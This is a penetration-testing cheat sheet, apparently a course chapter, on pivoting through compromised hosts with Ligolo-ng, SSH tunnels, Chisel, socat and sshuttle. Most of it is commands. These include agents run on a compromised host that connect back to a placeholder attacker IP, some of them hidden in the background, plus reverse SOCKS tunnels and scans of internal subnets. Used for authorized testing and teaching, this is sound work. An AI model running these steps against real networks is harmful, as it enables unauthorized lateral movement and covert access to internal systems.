# Pivoting with Ligolo-ng & Tunneling Strategy

## 🎯 Goal
Use compromised hosts as **pivot points** to reach internal networks and hidden services, while keeping traffic manageable and observable.

**🔗 Primary Tool**: [Ligolo-ng](https://github.com/nicocha30/ligolo-ng) - Next generation tunneling/pivoting tool

---
# Phase 7 - Network Pivoting & Tunneling

## 📋 Table of Contents

1. [Tool Selection Strategy](#51-tool-selection-strategy)
2. [Ligolo-ng Setup](#52-ligolo-ng-setup)
3. [Ligolo-ng Basic Usage](#53-ligolo-ng-basic-usage)
4. [Ligolo-ng Port Forwarding](#54-ligolo-ng-port-forwarding)
5. [Multi-Hop Pivoting](#55-multi-hop-pivoting)
6. [SSH Tunneling](#56-ssh-tunneling)
7. [Chisel](#57-chisel)
8. [Alternative Tools](#58-alternative-tools)
9. [Quick Reference](#59-quick-reference)


---

## 5.1 Tool Selection Strategy

|Tool|Use Case|Complexity|
|---|---|---|
|**Ligolo-ng** ⭐|Full subnet access, multi-hop, VPN-like routing|Medium|
|**SSH Tunneling**|Quick single-port forwards, existing SSH access|Low|
|**Chisel**|Cross-platform SOCKS, Windows environments|Medium|
|**Socat**|Simple TCP relays, minimal footprint|Low|

---

## 5.2 Ligolo-ng Setup

### Download & Install

```bash
# On attack machine
cd /opt && sudo mkdir ligolo-ng && sudo chown $USER:$USER ligolo-ng && cd ligolo-ng

# Download binaries
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_windows_amd64.zip

# Extract
tar xzf ligolo-ng_proxy_linux_amd64.tar.gz
tar xzf ligolo-ng_agent_linux_amd64.tar.gz
unzip ligolo-ng_agent_windows_amd64.zip
chmod +x proxy agent
```

### Setup TUN Interface (One-Time)

```bash
# Create interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

---

## 5.3 Ligolo-ng Basic Usage

### Start Proxy (Attack Machine)

```bash
# Terminal 1 - Start proxy
cd /opt/ligolo-ng
sudo ./proxy -laddr 0.0.0.0:11601 -selfcert
```

### Deploy Agent (Compromised Host)

```bash
# Linux
chmod +x agent
./agent -connect <ATTACKER_IP>:11601 -ignore-cert

# Background execution
nohup ./agent -connect <ATTACKER_IP>:11601 -ignore-cert &>/dev/null &

# Windows
.\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert

# Windows background
Start-Process -NoNewWindow -FilePath ".\agent.exe" -ArgumentList "-connect <ATTACKER_IP>:11601 -ignore-cert"
```

### Activate Session

```bash
# In proxy console
ligolo-ng » session              # List sessions
ligolo-ng » session 0            # Select session
[Agent : user@hostname] » start  # Start tunnel
```

### Add Routes (Terminal 2)

```bash
# Add route for internal subnet
sudo ip route add 10.10.10.0/24 dev ligolo

# Verify
ip route | grep ligolo

# Test connectivity
ping -c2 10.10.10.5
nmap -sT -Pn 10.10.10.0/24
```

---

## 5.4 Ligolo-ng Port Forwarding

### Create Listeners

```bash
# In active session
[Agent : user@hostname] » listener_add --addr 0.0.0.0:8080 --to 10.10.10.5:80
[Agent : user@hostname] » listener_add --addr 0.0.0.0:3390 --to 10.10.10.10:3389
[Agent : user@hostname] » listener_add --addr 0.0.0.0:1433 --to 10.10.10.20:1433

# List listeners
[Agent : user@hostname] » listener_list

# Remove listener
[Agent : user@hostname] » listener_stop 0
```

### Access Forwarded Services

```bash
# Web application
curl http://localhost:8080/

# RDP
xfreerdp /v:localhost:3390 /u:admin /p:password

# MSSQL
impacket-mssqlclient sa:password@localhost:1433
```

---

## 5.5 Multi-Hop Pivoting

### Scenario

```
Kali → Host A (Agent) → Host B (Agent) → Deep Network
       10.11.1.5        10.10.10.15       172.16.0.0/24
```

### Implementation

```bash
# 1. First hop active (Host A)
sudo ip route add 10.10.10.0/24 dev ligolo

# 2. Compromise Host B through first pivot
nmap -sT -Pn 10.10.10.15

# 3. Deploy second agent on Host B
./agent -connect <ATTACKER_IP>:11601 -ignore-cert

# 4. Select second session in proxy
ligolo-ng » session 1
[Agent : user@hostB] » start

# 5. Add route for deeper network
sudo ip route add 172.16.0.0/24 dev ligolo

# 6. Access deep network
nmap -sT -Pn 172.16.0.0/24
```

---

## 5.6 SSH Tunneling

### Local Port Forward

```bash
# Forward single port
ssh -L 8080:10.10.10.5:80 user@pivot_host

# Multiple ports
ssh -L 8080:10.10.10.5:80 -L 3389:10.10.10.10:3389 user@pivot_host

# Background
ssh -fNL 8080:10.10.10.5:80 user@pivot_host
```

### Dynamic SOCKS Proxy

```bash
# Create SOCKS5 proxy
ssh -D 1080 user@pivot_host

# Use with proxychains
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains firefox

# Configure /etc/proxychains4.conf
# Add: socks5 127.0.0.1 1080
```

### Remote Port Forward

```bash
# From compromised host (no direct access)
ssh -R 8080:localhost:80 attacker@<ATTACKER_IP>

# Access from attacker
curl http://localhost:8080/
```

---

## 5.7 Chisel

### Download

```bash
# On attack machine
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gunzip chisel_linux_amd64.gz
chmod +x chisel_linux_amd64
sudo mv chisel_linux_amd64 /usr/local/bin/chisel
```

### Reverse SOCKS Proxy

```bash
# Server (attack machine)
chisel server -p 8000 --reverse

# Client (compromised host)
chisel client <ATTACKER_IP>:8000 R:socks

# Use proxy
proxychains nmap -sT -Pn 10.10.10.0/24
```

### Reverse Port Forward

```bash
# Server (attack machine)
chisel server -p 8000 --reverse

# Client (forward remote port 80 to attacker's localhost:8080)
chisel client <ATTACKER_IP>:8000 R:8080:10.10.10.5:80

# Access
curl http://localhost:8080/
```

### Forward SOCKS Proxy

```bash
# Server (compromised host)
chisel server -p 8000 --socks5

# Client (attack machine)
chisel client PIVOT_IP:8000 socks

# Use SOCKS proxy on localhost:1080
proxychains nmap -sT -Pn 10.10.10.0/24
```

---

## 5.8 Alternative Tools

### Socat TCP Relay

```bash
# On pivot host
socat TCP-LISTEN:8080,fork TCP:10.10.10.5:80

# Access from attacker
curl http://pivot_host:8080/
```

### SSHuttle (VPN over SSH)

```bash
# Requires root/sudo on pivot
sshuttle -r user@pivot_host 10.10.10.0/24

# Auto-route without sudo
sshuttle -r user@pivot_host 10.10.10.0/24 --dns
```

### Metasploit Autoroute

```meterpreter
# In meterpreter session
run autoroute -s 10.10.10.0/24
run autoroute -p

# Use auxiliary modules through route
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
run
```

### Proxychains Configuration

```bash
# Edit /etc/proxychains4.conf
dynamic_chain    # Try proxies in order, skip dead ones
proxy_dns        # DNS through proxy
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080
```

---

## 5.9 Quick Reference

### Ligolo-ng Complete Flow

```bash
# 1. Setup (once)
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up

# 2. Start proxy
sudo ./proxy -laddr 0.0.0.0:11601 -selfcert

# 3. Deploy agent
./agent -connect <ATTACKER_IP>:11601 -ignore-cert

# 4. Activate (in proxy)
session 0
start

# 5. Add route
sudo ip route add TARGET_SUBNET/24 dev ligolo

# 6. Test
ping TARGET_IP
```

### SSH Quick Pivots

```bash
# Local forward
ssh -L LOCAL_PORT:TARGET_IP:TARGET_PORT user@pivot

# Dynamic SOCKS
ssh -D 1080 user@pivot

# Remote forward
ssh -R REMOTE_PORT:localhost:LOCAL_PORT user@remote
```

### Chisel Quick Setup

```bash
# Reverse SOCKS (most common)
chisel server -p 8000 --reverse             # Attacker
chisel client <ATTACKER_IP>:8000 R:socks     # Target
proxychains tool                            # Use it
```

### Route Management

```bash
# Add route
sudo ip route add 10.10.10.0/24 dev ligolo

# Remove route
sudo ip route del 10.10.10.0/24 dev ligolo

# Show routes
ip route | grep ligolo

# Remove all ligolo routes
ip route | grep ligolo | cut -d' ' -f1 | xargs -I {} sudo ip route del {}
```

### Common Ports to Forward

```bash
# SMB
listener_add --addr 0.0.0.0:445 --to 10.10.10.5:445

# RDP
listener_add --addr 0.0.0.0:3389 --to 10.10.10.5:3389

# WinRM
listener_add --addr 0.0.0.0:5985 --to 10.10.10.5:5985

# MSSQL
listener_add --addr 0.0.0.0:1433 --to 10.10.10.5:1433

# PostgreSQL
listener_add --addr 0.0.0.0:5432 --to 10.10.10.5:5432
```
